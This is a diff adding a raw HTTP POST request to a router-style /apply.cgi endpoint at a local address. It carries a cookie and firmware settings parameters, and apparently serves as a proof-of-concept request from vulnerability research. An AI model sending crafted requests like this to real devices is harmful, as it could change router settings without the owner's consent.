@@ -1,0 +1,7 @@
+POST /apply.cgi HTTP/1.1
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Type: xml/text
+Content-Length: 115
+
+test=test&show_traffic=upgrade_check_free.cgi&submit_flag=upgrade_check_free.cgi&qos_port_priority=6&plc_qos_port=1
